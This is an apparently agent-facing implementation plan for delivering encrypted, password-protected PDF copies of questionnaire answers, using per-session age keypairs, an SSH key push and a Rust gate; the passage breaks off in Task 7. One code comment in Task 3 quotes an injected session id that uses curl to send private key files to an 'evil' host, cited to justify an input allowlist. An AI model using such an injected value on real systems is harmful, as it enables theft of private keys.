# Decryptable Questionnaire PDF Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Deliver each respondent a typeset PDF of their own questionnaire answers, optionally password-protected, without any single machine being able to read the corpus.

**Architecture:** A per-session age keypair is minted in `/api/gate-submit`. Iceland keeps the public key and all ciphertext; the private key is pushed to the Romania box over WireGuard and shredded 7 days after delivery. Every answer encrypts to two recipients — the session key and an offline break-glass key. On explicit consent at `/completion`, Iceland pushes the ciphertext bundle to Romania, which decrypts it, renders a PDF with Typst, optionally encrypts it with qpdf, and mails it via Apple submission.

**Tech Stack:** Deno + Fresh 1.7.3, Preact, Postgres, `@age/age-encryption` (JSR ^0.3.0), Rust gate service (axum + `age` crate + sqlx), Typst, qpdf, denomailer 1.6.0, WireGuard.

**Spec:** `docs/superpowers/specs/2026-08-10-decryptable-questionnaire-pdf-design.md`

## Global Constraints

Every task's requirements implicitly include this section.

- **Fail closed.** If encryption, key generation, or key transport fails, refuse the operation. Never persist or send a weaker artifact than promised. Pattern to follow: `routes/api/gate-submit.ts:120`.
- **Zero logging of sensitive material.** No answer text, no email address, no password, no private key in any log line, exception message, or error body. `scripts/check-zero-logging.sh` and `scripts/check-secrets.sh` must pass.
- **No-JS paths must work.** The gate parses urlencoded bodies deliberately (`routes/api/gate-submit.ts:41`). The consent UI must function with JavaScript disabled; use CSS `:checked` for conditional reveal.
- **Formatting** (`deno.json`): single quotes, 2-space indent, semicolons, 120-column lines. Run `deno fmt` before every commit.
- **Test command:** `deno task test` (= `deno test --allow-net --allow-read --allow-write --allow-env`).
- **Verbatim copy — do not reword:**
  - Password helper: `Remember this password. No one can reset it. Should you forget it, however, you may request another copy of the pdf be sent to you.`
  - Password field placeholder: `password optional`
  - Radio labels: `Yes, please` and `No`
  - Submit button: `Send me a .pdf email`
- **PDF encryption is AES-256 with a _user_ password.** Never an owner password — owner passwords set permission flags that any tool strips and provide no confidentiality.
- **Never fall back to sending an unencrypted PDF** when a password was supplied and encryption failed.

## Verified API facts

These were confirmed by execution before this plan was written. Trust them.

```ts
import { armor, Decrypter, Encrypter, generateX25519Identity, identityToRecipient } from '@age/age-encryption';

const identity = await generateX25519Identity(); // string, "AGE-SECRET-KEY-1..."
const recipient = await identityToRecipient(identity); // string, "age1..."

const e = new Encrypter();
e.addRecipient(recipientA); // calling addRecipient twice yields a
e.addRecipient(recipientB); // ciphertext EITHER identity can open
const armored: string = armor.encode(await e.encrypt('plaintext'));

const d = new Decrypter();
d.addIdentity(identity);
const text: string = await d.decrypt(armor.decode(armored), 'text');
// An unrelated identity throws. Confirmed.
```

The Rust gate lives in this repo at `rust-server/`, exposes `POST /api/store`
(`rust-server/src/main.rs:261`), and already encrypts via
`age::Encryptor::with_recipients` — which takes an iterator, so multi-recipient
is a signature change, not a redesign.

## File Structure

**Iceland (this repo)**

| File                                      | Responsibility                                                                                            |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `lib/age-encrypt.ts`                      | _modify_ — add `ageEncryptTo(plaintext, recipients[])`; leave `ageEncrypt` untouched for the contact form |
| `lib/session-keys.ts`                     | _create_ — mint keypairs, push identities to Romania, injectable transport                                |
| `lib/romania-client.ts`                   | _create_ — mesh HTTP client for the delivery push                                                         |
| `lib/gate-client.ts`                      | _modify_ — forward per-session recipients to the gate                                                     |
| `rust-server/src/main.rs`                 | _modify_ — accept and honour a `recipients` array                                                         |
| `db/migrations/009_session_keys.sql`      | _create_ — `session_pubkey`, `encrypted_email`, `pdf_delivered_at`, resend tokens                         |
| `routes/api/gate-submit.ts`               | _modify_ — mint and push keypair before storing anything                                                  |
| `routes/api/questions/answer.ts`          | _modify_ — thread session recipients                                                                      |
| `routes/completion.tsx`                   | _modify_ — consent UI                                                                                     |
| `routes/api/responses/deliver.ts`         | _create_ — assemble bundle, push to Romania                                                               |
| `routes/api/responses/forget.ts`          | _create_ — delete rows, revoke tokens                                                                     |
| `routes/api/responses/resend/[token].tsx` | _create_ — address-locked re-issue                                                                        |
| `routes/privacy.tsx`, `routes/index.tsx`  | _modify_ — correct the now-false claims                                                                   |

**Romania (deployed separately, source lives here)**

| File                        | Responsibility                                      |
| --------------------------- | --------------------------------------------------- |
| `romania/keystore.ts`       | 0600 identity read/write, 7-day shred               |
| `romania/render.ts`         | Typst invocation                                    |
| `romania/protect.ts`        | qpdf encryption + round-trip verification           |
| `romania/template.typ`      | document design                                     |
| `romania/render-service.ts` | mesh-bound listener wiring the above together       |
| `lib/email.ts`              | _modify_ — attachment support (shared with Iceland) |

Phase 5 (Romania) is independently deployable and can be built and tested
against fixture bundles before Phase 3 is finished.

---

## Task 1: Multi-recipient encryption in Fresh

**Files:**

- Modify: `lib/age-encrypt.ts`
- Test: `tests/age_encrypt_test.ts` (create)

**Interfaces:**

- Consumes: nothing
- Produces: `ageEncryptTo(plaintext: string, recipients: string[]): Promise<string>` — returns ASCII-armored ciphertext openable by any listed recipient. Throws on an empty array.

- [x] **Step 1: Write the failing test**

```ts
// tests/age_encrypt_test.ts
import { assertEquals, assertRejects } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { armor, Decrypter, generateX25519Identity, identityToRecipient } from '@age/age-encryption';
import { ageEncryptTo } from '../lib/age-encrypt.ts';

async function open(armored: string, identity: string): Promise<string> {
  const d = new Decrypter();
  d.addIdentity(identity);
  return await d.decrypt(armor.decode(armored), 'text');
}

Deno.test('ageEncryptTo - both recipients can open the same ciphertext', async () => {
  const session = await generateX25519Identity();
  const breakglass = await generateX25519Identity();
  const armored = await ageEncryptTo('intimate answer', [
    await identityToRecipient(session),
    await identityToRecipient(breakglass),
  ]);

  assertEquals(await open(armored, session), 'intimate answer');
  assertEquals(await open(armored, breakglass), 'intimate answer');
});

Deno.test('ageEncryptTo - an unrelated identity cannot open it', async () => {
  const session = await generateX25519Identity();
  const armored = await ageEncryptTo('secret', [await identityToRecipient(session)]);
  const stranger = await generateX25519Identity();

  await assertRejects(() => open(armored, stranger));
});

Deno.test('ageEncryptTo - empty recipient list is refused', async () => {
  await assertRejects(() => ageEncryptTo('secret', []), Error, 'no recipients');
});
```

- [x] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/age_encrypt_test.ts`
Expected: FAIL — `ageEncryptTo` is not exported from `lib/age-encrypt.ts`.

- [x] **Step 3: Write minimal implementation**

Append to `lib/age-encrypt.ts` (leave `ageEncrypt` exactly as it is — the
contact form depends on it):

```ts
/**
 * Encrypt to several recipients at once. Any one of their identities opens the
 * result; none of them can be derived from the ciphertext.
 *
 * Used for per-session encryption, where every answer goes to the respondent's
 * session key AND the offline break-glass key. Refusing an empty list matters:
 * age would otherwise produce a file nobody on earth can decrypt, and the
 * failure would not surface until someone tried to read it months later.
 */
export async function ageEncryptTo(
  plaintext: string,
  recipients: string[],
): Promise<string> {
  if (recipients.length === 0) {
    throw new Error('ageEncryptTo: no recipients');
  }
  const e = new Encrypter();
  for (const r of recipients) e.addRecipient(r);
  return armor.encode(await e.encrypt(plaintext));
}
```

- [x] **Step 4: Run test to verify it passes**

Run: `deno test --allow-net --allow-read --allow-env tests/age_encrypt_test.ts`
Expected: PASS, 3 tests.

- [x] **Step 5: Commit**

```bash
deno fmt lib/age-encrypt.ts tests/age_encrypt_test.ts
git add lib/age-encrypt.ts tests/age_encrypt_test.ts
git commit -m "feat(crypto): encrypt to multiple age recipients"
```

---

## Task 2: Multi-recipient support in the Rust gate

**Files:**

- Modify: `rust-server/src/main.rs` (`StoreReq` ~line 39, `armor_encrypt` line 85, `store` line 118)

**Interfaces:**

- Consumes: nothing
- Produces: `POST /api/store` accepts an optional `recipients: string[]`. When present and non-empty, the answer is encrypted to exactly those recipients. When absent or empty, behaviour is unchanged (the configured default recipient), so existing callers keep working.

- [x] **Step 1: Write the failing test**

Add to `rust-server/src/main.rs`, at the bottom:

```rust
#[cfg(test)]
mod tests {
    use super::*;

    fn parse(s: &str) -> age::x25519::Recipient {
        s.parse().expect("valid recipient")
    }

    #[test]
    fn encrypts_to_every_listed_recipient() {
        let a = age::x25519::Identity::generate();
        let b = age::x25519::Identity::generate();
        let recipients = vec![parse(&a.to_public().to_string()), parse(&b.to_public().to_string())];

        let armored = armor_encrypt("intimate answer", &recipients).expect("encrypt");

        for id in [&a, &b] {
            let decryptor = age::Decryptor::new(age::armor::ArmoredReader::new(armored.as_bytes()))
                .expect("decryptor");
            let mut reader = decryptor
                .decrypt(iter::once(id as &dyn age::Identity))
                .expect("decrypt");
            let mut out = String::new();
            reader.read_to_string(&mut out).expect("read");
            assert_eq!(out, "intimate answer");
        }
    }

    #[test]
    fn refuses_an_empty_recipient_list() {
        assert!(armor_encrypt("x", &[]).is_err());
    }
}
```

Add `use std::io::Read;` to the test module if the crate does not already import it.

- [x] **Step 2: Run test to verify it fails**

Run: `cd rust-server && cargo test`
Expected: FAIL to compile — `armor_encrypt` takes `&age::x25519::Recipient`, not a slice.

- [x] **Step 3: Write minimal implementation**

Change the signature and body of `armor_encrypt` (line 85):

```rust
/// Encrypt to every supplied recipient. Any one of their identities opens the
/// result. An empty list is rejected rather than silently producing a file no
/// key can ever open.
fn armor_encrypt(
    plaintext: &str,
    recipients: &[age::x25519::Recipient],
) -> Result<String, AppError> {
    if recipients.is_empty() {
        return Err(AppError::Encryption("no recipients".into()));
    }
    let refs: Vec<&dyn age::Recipient> =
        recipients.iter().map(|r| r as &dyn age::Recipient).collect();
    let encryptor = age::Encryptor::with_recipients(refs.into_iter())
        .map_err(|e| AppError::Encryption(format!("encryptor init: {e}")))?;
    // ...rest of the function body is unchanged...
```

Add the field to `StoreReq` (line 39):

```rust
#[serde(default)]
recipients: Vec<String>,
```

And in `store` (line 118), replace the `armor_encrypt` call:

```rust
// Per-session recipients when the caller supplies them, else the service
// default. Parsing failures must abort: encrypting to a partial set would
// silently drop the break-glass key and make recovery impossible.
let recipients: Vec<age::x25519::Recipient> = if req.recipients.is_empty() {
    vec![(*state.recipient).clone()]
} else {
    req.recipients
        .iter()
        .map(|r| r.parse::<age::x25519::Recipient>())
        .collect::<Result<Vec<_>, _>>()
        .map_err(|_| AppError::Validation("bad recipient".into()))?
};
if req.recipients.len() > 8 {
    return Err(AppError::Validation("too many recipients".into()));
}
let ciphertext = armor_encrypt(&req.answer, &recipients)?;
```

- [x] **Step 4: Run tests to verify they pass**

Run: `cd rust-server && cargo test && cargo clippy -- -D warnings`
Expected: PASS, 2 tests, no clippy warnings.

- [x] **Step 5: Commit**

```bash
git add rust-server/src/main.rs
git commit -m "feat(gate): accept per-session recipients on /api/store"
```

---

## Task 3: Session keypair generation and transport

**Files:**

- Create: `lib/session-keys.ts`
- Test: `tests/session_keys_test.ts` (create)

**Interfaces:**

- Consumes: nothing
- Produces:
  - `generateSessionKeypair(): Promise<{ identity: string; recipient: string }>`
  - `type IdentityTransport = (sessionId: string, identity: string) => Promise<void>`
  - `pushIdentity(sessionId: string, identity: string, transport?: IdentityTransport): Promise<void>` — throws if the transport fails. Default transport shells out to `scp` over the mesh.
  - `breakglassRecipient(): string` — reads `BREAKGLASS_AGE_RECIPIENT`, throws if unset.

- [x] **Step 1: Write the failing test**

```ts
// tests/session_keys_test.ts
import { assert, assertEquals, assertRejects } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { armor, Decrypter } from '@age/age-encryption';
import { ageEncryptTo } from '../lib/age-encrypt.ts';
import { generateSessionKeypair, pushIdentity } from '../lib/session-keys.ts';

Deno.test('generateSessionKeypair - keypair is usable and unique per call', async () => {
  const a = await generateSessionKeypair();
  const b = await generateSessionKeypair();

  assert(a.identity.startsWith('AGE-SECRET-KEY-'));
  assert(a.recipient.startsWith('age1'));
  assert(a.identity !== b.identity, 'each session must get its own key');

  const armored = await ageEncryptTo('answer', [a.recipient]);
  const d = new Decrypter();
  d.addIdentity(a.identity);
  assertEquals(await d.decrypt(armor.decode(armored), 'text'), 'answer');
});

Deno.test('pushIdentity - hands the identity to the transport', async () => {
  const seen: Array<{ id: string; key: string }> = [];
  await pushIdentity('sess-1', 'AGE-SECRET-KEY-TEST', (id, key) => {
    seen.push({ id, key });
    return Promise.resolve();
  });
  assertEquals(seen, [{ id: 'sess-1', key: 'AGE-SECRET-KEY-TEST' }]);
});

Deno.test('pushIdentity - a failing transport propagates (fails closed)', async () => {
  await assertRejects(
    () => pushIdentity('sess-1', 'AGE-SECRET-KEY-TEST', () => Promise.reject(new Error('mesh down'))),
    Error,
  );
});

Deno.test('pushIdentity - transport failure message carries no key material', async () => {
  const err = await pushIdentity('sess-1', 'AGE-SECRET-KEY-LEAKME', () => Promise.reject(new Error('boom')))
    .then(() => null, (e: Error) => e);
  assert(err !== null);
  assert(!err.message.includes('LEAKME'), 'key material must never reach an error message');
});
```

- [x] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/session_keys_test.ts`
Expected: FAIL — `lib/session-keys.ts` does not exist.

- [x] **Step 3: Write minimal implementation**

```ts
// lib/session-keys.ts
/**
 * Per-session age keypairs.
 *
 * Iceland mints the pair, keeps the recipient (public), and pushes the identity
 * (private) to the Romania box over the WireGuard mesh. Iceland never writes
 * the identity to disk and never logs it.
 *
 * Everything here fails closed. A session whose identity never reached Romania
 * is a session whose PDF could never be produced, so there is no value in
 * letting the submission continue.
 */

import { generateX25519Identity, identityToRecipient } from '@age/age-encryption';

export interface SessionKeypair {
  identity: string;
  recipient: string;
}

export type IdentityTransport = (sessionId: string, identity: string) => Promise<void>;

// AMENDED 2026-08-11 (command injection). The session id is interpolated into
// ssh's REMOTE COMMAND argument. `new Deno.Command('ssh', { args: [...] })`
// spawns no local shell, which makes the array form look safe -- and locally it
// is -- but sshd concatenates its arguments and feeds them to the login shell.
// Without this allowlist, a session id of
//     x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #
// executes on the one box holding every respondent's private key.
// Charset matches romania/keystore.ts's SESSION_ID exactly so both ends agree.
const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;

export function assertSafeSessionId(sessionId: string): void {
  if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
}

const ROMANIA_SSH = Deno.env.get('ROMANIA_SSH_DEST') || '';
const ROMANIA_KEY_DIR = Deno.env.get('ROMANIA_KEY_DIR') || '';
const ROMANIA_SSH_KEY = Deno.env.get('ROMANIA_SSH_KEY') || '';

export async function generateSessionKeypair(): Promise<SessionKeypair> {
  const identity = await generateX25519Identity();
  return { identity, recipient: await identityToRecipient(identity) };
}

/**
 * The offline break-glass recipient. Absent configuration is fatal rather than
 * defaulted: silently encrypting to the session key alone would produce data
 * that becomes unrecoverable the moment the session key is shredded.
 */
export function breakglassRecipient(): string {
  const r = Deno.env.get('BREAKGLASS_AGE_RECIPIENT');
  if (!r) throw new Error('BREAKGLASS_AGE_RECIPIENT not configured');
  return r;
}

/**
 * Default transport: scp over the mesh, identity delivered on stdin so it never
 * touches Iceland's filesystem. StrictHostKeyChecking=yes is the point of the
 * exercise — an unpinned host key would let anything on the mesh collect keys.
 */
const scpTransport: IdentityTransport = async (sessionId, identity) => {
  assertSafeSessionId(sessionId); // builds a remote shell command; checks itself
  if (!ROMANIA_SSH || !ROMANIA_KEY_DIR) {
    throw new Error('Romania transport not configured');
  }
  const cmd = new Deno.Command('ssh', {
    args: [
      '-i',
      ROMANIA_SSH_KEY,
      '-o',
      'IdentitiesOnly=yes',
      '-o',
      'StrictHostKeyChecking=yes',
      '-o',
      'ConnectTimeout=10',
      ROMANIA_SSH,
      // Quoted as belt-and-braces: the allowlist already excludes every
      // metacharacter, so a future widening degrades to a wrong filename
      // rather than to remote execution.
      `umask 077 && cat > '${ROMANIA_KEY_DIR}/${sessionId}.key'`,
    ],
    stdin: 'piped',
    stdout: 'null',
    stderr: 'null',
  });
  const child = cmd.spawn();
  const w = child.stdin.getWriter();
  await w.write(new TextEncoder().encode(identity));
  await w.close();
  const out = await child.output();
  if (!out.success) {
    // No stderr, no identity, no session id in the message.
    throw new Error('identity transport failed');
  }
};

export async function pushIdentity(
  sessionId: string,
  identity: string,
  transport: IdentityTransport = scpTransport,
): Promise<void> {
  assertSafeSessionId(sessionId); // before ANY transport, including injected ones
  try {
    await transport(sessionId, identity);
  } catch {
    // Re-thrown as a bare category so no callee message can carry key material.
    throw new Error('identity transport failed');
  }
}
```

- [x] **Step 4: Run test to verify it passes**

Run: `deno test --allow-net --allow-read --allow-env tests/session_keys_test.ts`
Expected: PASS, 4 tests.

- [x] **Step 5: Commit**

```bash
deno fmt lib/session-keys.ts tests/session_keys_test.ts
git add lib/session-keys.ts tests/session_keys_test.ts
git commit -m "feat(crypto): per-session age keypairs with fail-closed transport"
```

---

## Task 4: Schema migration

**Files:**

- Create: `db/migrations/009_session_keys.sql`

**Interfaces:**

- Produces: `fresh_gate_responses.session_pubkey`, `.encrypted_email`, `.pdf_delivered_at`; table `pdf_resend_tokens`.

**Before writing:** confirm how migrations are applied. `db/migrations/` contains
duplicate numeric prefixes (two `001`, two `002`, two `003`, no `005`), so the
runner is not keying on the prefix alone. Read `migrate.ts` and match its
convention, or `009` may silently never run.

- [x] **Step 1: Read the migration runner**

Run: `cat migrate.ts`
Confirm: how files are discovered, ordered, and recorded as applied.

- [x] **Step 2: Write the migration**

```sql
-- Session keys + PDF delivery
--
-- Supersedes the premise of 004_pdf_delivery_pipeline.sql, which assumed a
-- single global identity could decrypt every address. Here each session has its
-- own keypair; the private half lives only on the Romania box.
--
-- 004 put encrypted_email on fresh_gate_responses (Iceland) but pdf_delivered_at
-- on gate_responses (Local). Both belong on the Iceland table, so both are
-- (re)declared here idempotently rather than assumed present.

ALTER TABLE fresh_gate_responses
  ADD COLUMN IF NOT EXISTS session_pubkey TEXT,
  ADD COLUMN IF NOT EXISTS encrypted_email TEXT,
  ADD COLUMN IF NOT EXISTS pdf_delivered_at TIMESTAMPTZ;

COMMENT ON COLUMN fresh_gate_responses.session_pubkey IS
  'age recipient (public). The matching identity lives only on the Romania box.';
COMMENT ON COLUMN fresh_gate_responses.encrypted_email IS
  'Delivery address, age-encrypted to session_pubkey + break-glass. Unreadable here.';

-- Address-locked re-send capabilities. The destination is never stored on the
-- token: it is always resolved from the row's encrypted_email, so a stolen
-- token can only ever mail the same person.
CREATE TABLE IF NOT EXISTS pdf_resend_tokens (
  token       TEXT PRIMARY KEY,
  gate_token  TEXT NOT NULL REFERENCES fresh_gate_responses (gate_token) ON DELETE CASCADE,
  expires_at  TIMESTAMPTZ NOT NULL,
  used_at     TIMESTAMPTZ,
  created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_pdf_resend_tokens_gate
  ON pdf_resend_tokens (gate_token);

CREATE INDEX IF NOT EXISTS idx_fresh_gate_responses_undelivered
  ON fresh_gate_responses (gate_token)
  WHERE pdf_delivered_at IS NULL;
```

- [ ] **Step 3: Apply against a scratch database and verify**

Run:

```bash
# AMENDED 2026-08-11: use an EXPLICIT scratch URL, never ambient $DATABASE_URL.
# In a shell that has sourced production env -- which is how anyone debugging
# the live gate gets there -- the original ran this against Iceland.
SCRATCH_DB="postgresql://localhost/a4t_scratch"

case "$SCRATCH_DB" in
  *fobdongle*|*iceland*|*prod*) echo "refusing: that looks like production" >&2; exit 1;;
esac

psql "$SCRATCH_DB" -f db/migrations/009_session_keys.sql
psql "$SCRATCH_DB" -c "\d fresh_gate_responses" | grep -E 'session_pubkey|encrypted_email|pdf_delivered_at'
psql "$SCRATCH_DB" -c "\d pdf_resend_tokens"
```

Expected: all three columns listed; `pdf_resend_tokens` exists.

- [ ] **Step 4: Verify idempotency**

Run: `psql "$SCRATCH_DB" -f db/migrations/009_session_keys.sql`
Expected: succeeds a second time with no error.

- [ ] **Step 5: Commit**

```bash
git add db/migrations/009_session_keys.sql
git commit -m "feat(db): session pubkeys, encrypted email, resend tokens"
```

---

## Task 5: Mint and push the keypair in gate-submit

**Files:**

- Modify: `routes/api/gate-submit.ts` (Step 1 at line ~91 through Step 4)
- Modify: `lib/gate-client.ts` (add `recipients` to the request)
- Test: `tests/gate_submit_keys_test.ts` (create)

**Interfaces:**

- Consumes: `generateSessionKeypair`, `pushIdentity`, `breakglassRecipient` (Task 3); `ageEncryptTo` (Task 1); `recipients` on `/api/store` (Task 2)
- Produces: `fresh_gate_responses` rows carrying `session_pubkey` and `encrypted_email`; answers encrypted to the session pair.

**Ordering matters:** the keypair must be minted and pushed _before_ the existing
Step 2 stores any answer. Today Step 2 (store) precedes Step 3 (magic link);
the push becomes the new first point of failure.

- [ ] **Step 1: Add recipients to the gate client**

In `lib/gate-client.ts`, extend `StoreAnswerParams` and the request body:

```ts
interface StoreAnswerParams {
  sessionId: string;
  questionText: string;
  questionIndex: number;
  answer: string;
  skipped: boolean;
  /** age recipients. Empty/omitted keeps the gate's configured default. */
  recipients?: string[];
}
```

and inside the `JSON.stringify` body, add:

```ts
recipients: params.recipients ?? [],
```

- [ ] **Step 2: Write the failing test**

```ts
// tests/gate_submit_keys_test.ts
import { assert, assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { armor, Decrypter } from '@age/age-encryption';
import { ageEncryptTo } from '../lib/age-encrypt.ts';
import { generateSessionKeypair } from '../lib/session-keys.ts';

Deno.test('gate-submit crypto contract - address is recoverable only with the session identity', async () => {
  const session = await generateSessionKeypair();
  const breakglass = await generateSessionKeypair();

  const armored = await ageEncryptTo('person@example.com', [session.recipient, breakglass.recipient]);

  for (const id of [session.identity, breakglass.identity]) {
    const d = new Decrypter();
    d.addIdentity(id);
    assertEquals(await d.decrypt(armor.decode(armored), 'text'), 'person@example.com');
  }

  assert(!armored.includes('person@example.com'), 'address must not appear in the ciphertext');
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/gate_submit_keys_test.ts`
Expected: FAIL until Tasks 1 and 3 are merged; PASS afterwards. If it already
passes, that is fine — it pins the contract the route must honour.

- [ ] **Step 4: Wire the route**

In `routes/api/gate-submit.ts`, immediately after `const gateToken = crypto.randomUUID();`
insert:

```ts
// Step 1b: Mint this session's keypair and hand the private half to
// Romania BEFORE anything is stored. If the mesh is down we abort: a
// session whose identity never arrived is one whose PDF could never be
// produced, and storing it would be storing an unreadable orphan.
//
// AMENDED 2026-08-11: breakglassRecipient() is now read BEFORE the push, not
// after. It throws when unconfigured, and in the original order that throw
// landed after the identity had already reached Romania -- so a missing env
// var left a key on the key box for a session that was then refused and never
// existed. Read the cheap local thing first; touch the remote box only once
// everything that can fail locally already has not.
let recipients: string[];
let pushed = false;
try {
  const breakglass = breakglassRecipient();
  const keypair = await generateSessionKeypair();
  await pushIdentity(gateToken, keypair.identity);
  pushed = true;
  recipients = [keypair.recipient, breakglass];
} catch (e) {
  // AMENDED 2026-08-11: a FAILED push can still have left a key behind.
  // pushIdentity kills ssh at its deadline, and a killed `cat > file` may have
  // written a complete key, a truncated one, or nothing -- indistinguishable
  // from here. Cleaning up only after a *successful* push therefore misses the
  // exact case the deadline exists to handle.
  if (e instanceof IdentityPushFailed && e.ambiguous) {
    await shredRemoteIdentity(gateToken).catch(() => {});
  }
  console.error('[gate-submit] Session key provisioning failed; submission refused');
  increment('errors.5xx');
  return fail(503, 'Unable to securely store your answers right now. Please try again.', 'server');
}
```

**Everything after the push needs unwinding on failure.** Once `pushed` is
true, an identity exists on Romania for a session that may still not come into
being — the answer writes or the row insert can fail. Wrap the remainder of the
handler so any failure past this point removes the pushed identity and any
answers already written for `gateToken`:

```ts
try {
  // ...storeEncryptedAnswer x2, ageEncryptTo(email), the INSERT...
} catch (e) {
  if (pushed) {
    // Best-effort. A failure here leaves an orphaned key, which the absolute
    // 30-day ceiling in romania/keystore.ts will eventually collect -- that
    // ceiling is the backstop for exactly this path.
    await shredRemoteIdentity(gateToken).catch(() => {});
    await deleteGateAnswers(gateToken).catch(() => {});
  }
  throw e;
}
```

Pass `recipients` to both `storeEncryptedAnswer` calls by adding `recipients,`
to each params object.

Replace the `INSERT` with one that records the public key and address:

```ts
const encryptedEmail = await ageEncryptTo(email, recipients);

await withConnection(async (client) => {
  await client.queryObject(
    `INSERT INTO fresh_gate_responses (gate_token, q0_answer, q1_answer, session_pubkey, encrypted_email)
           VALUES ($1, NULL, NULL, $2, $3)`,
    [gateToken, recipients[0], encryptedEmail],
  );
});
```

Add the imports at the top of the file:

```ts
import { ageEncryptTo } from '../../lib/age-encrypt.ts';
import { breakglassRecipient, generateSessionKeypair, pushIdentity } from '../../lib/session-keys.ts';
```

- [ ] **Step 5: Run the full suite and the logging check**

Run: `deno task test && ./scripts/check-zero-logging.sh && deno check main.ts`
Expected: PASS. No new log line mentions the address, an answer, or a key.

- [ ] **Step 6: Commit**

```bash
deno fmt routes/api/gate-submit.ts lib/gate-client.ts tests/gate_submit_keys_test.ts
git add routes/api/gate-submit.ts lib/gate-client.ts tests/gate_submit_keys_test.ts
git commit -m "feat(gate-submit): mint session keypair and encrypt address to it"
```

---

## Task 6: Thread session recipients through answer submission

**Files:**

- Modify: `routes/api/questions/answer.ts`
- Test: `tests/answer_recipients_test.ts` (create)

**Interfaces:**

- Consumes: `session_pubkey` from Task 4's schema; `breakglassRecipient` from Task 3
- Produces: Q2–Q34 encrypted to the same pair as Q0/Q1.

- [ ] **Step 1: Write the failing test**

```ts
// tests/answer_recipients_test.ts
import { assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { recipientsForSession } from '../routes/api/questions/answer.ts';

Deno.test('recipientsForSession - pairs the stored pubkey with break-glass', () => {
  assertEquals(recipientsForSession('age1session', 'age1breakglass'), ['age1session', 'age1breakglass']);
});

// AMENDED 2026-08-11. recipientsForSession throws SYNCHRONOUSLY, so the
// original assertRejects form was wrong twice over: the arrow threw before
// Promise.resolve ran, and the un-awaited assertion escaped the test. Verified
// against std 0.208 -- it does not merely false-pass, it raises an uncaught
// "Function throws when expected to reject" that fails the whole module and
// cancels sibling tests. Use assertThrows.
// AMENDED AGAIN 2026-08-11 for rollout: a NULL pubkey is a pre-existing session,
// not an error. It must degrade to the gate default so people mid-questionnaire
// at deploy time can finish, rather than hitting a hard failure.
Deno.test('recipientsForSession - a legacy session falls back to the gate default', () => {
  assertEquals(recipientsForSession(null, 'age1breakglass'), []);
});

Deno.test('recipientsForSession - never returns break-glass alone', () => {
  // Encrypting to break-glass only would produce a row the respondent could
  // never receive and only an offline ceremony could open.
  assertEquals(recipientsForSession(null, 'age1breakglass').includes('age1breakglass'), false);
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/answer_recipients_test.ts`
Expected: FAIL — `recipientsForSession` is not exported.

- [ ] **Step 3: Implement**

Add to `routes/api/questions/answer.ts`:

```ts
/**
 * Recipients for a session's answers.
 *
 * AMENDED 2026-08-11 for rollout. The original threw on a missing pubkey, which
 * is correct for a NEW session -- gate-submit fails closed, so one cannot exist
 * -- but every questionnaire already in flight at deploy time has a NULL
 * pubkey. Throwing would have broken those people mid-run, at whichever
 * question they happened to be on, with no way to finish or resume.
 *
 * A legacy session therefore returns an empty list, which `storeEncryptedAnswer`
 * sends as `recipients: []` and the gate reads as "use my configured default"
 * -- exactly the behaviour those sessions started under. They stay readable by
 * the global identity and simply never become PDF-eligible.
 *
 * This branch is temporary. `sessions.legacy_recipients` counts every use; when
 * it reaches zero and stays there for longer than a session can live, delete
 * the branch and restore the throw.
 */
export function recipientsForSession(sessionPubkey: string | null, breakglass: () => string): string[] {
  if (!sessionPubkey) {
    increment('sessions.legacy_recipients');
    return [];
  }
  // AMENDED during execution: a thunk, not a string. breakglassRecipient()
  // throws when unconfigured, and an eagerly-evaluated argument threw on the
  // legacy path too -- turning a missing env var into a failure for exactly
  // the sessions that never needed the key.
  return [sessionPubkey, breakglass()];
}
```

In the POST handler, resolve the pubkey and pass
`recipients: recipientsForSession(sessionPubkey, breakglassRecipient)` into
`storeEncryptedAnswer` — note the bare function reference, not a call.

**AMENDED during execution:** the pubkey comes from a dedicated
`getSessionPubkey(sessionId)` in `lib/questionnaire-session.ts`, _not_ from
widening `getSessionByToken` / `getSessionById` / `findActiveSession`. Those
three run on every answer and every resume; adding a join there means editing
the hot path of a live questionnaire, and with no database available to test
against, a mistake would break people mid-run. The separate query is additive —
if its join is wrong it returns null, and the caller degrades to the legacy
path rather than failing.

**Consequence to carry into Task 8:** a legacy session's answers are encrypted
to the global identity, so Romania cannot render them. `/api/responses/deliver`
must check `session_pubkey IS NOT NULL` before offering delivery and tell those
respondents plainly that a copy is not available for a questionnaire begun
before this existed — rather than accepting the request and failing silently in
a queue they cannot see.

- [ ] **Step 4: Run tests**

Run: `deno test --allow-net --allow-read --allow-env tests/answer_recipients_test.ts && deno check main.ts`
Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
deno fmt routes/api/questions/answer.ts tests/answer_recipients_test.ts
git add routes/api/questions/answer.ts tests/answer_recipients_test.ts
git commit -m "feat(answers): encrypt questionnaire answers to the session keypair"
```

---

## Task 7: Consent UI on the completion page

**Files:**

- Modify: `routes/completion.tsx`
- Create: `public/css/consent.css`
- Test: `tests/completion_consent_test.tsx` (create)

**Interfaces:**

- Consumes: nothing
- Produces: a form posting `consent`, `password` and the resume token to `/api/responses/deliver`.

The page is currently static and takes no props; it must be given the session's
resume token. The reveal is CSS-only so the page keeps working without JS.

- [ ] **Step 1: Write the failing test**

```ts
// tests/completion_consent_test.tsx
import { assert, assertStringIncludes } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { render } from 'preact-render-to-string';
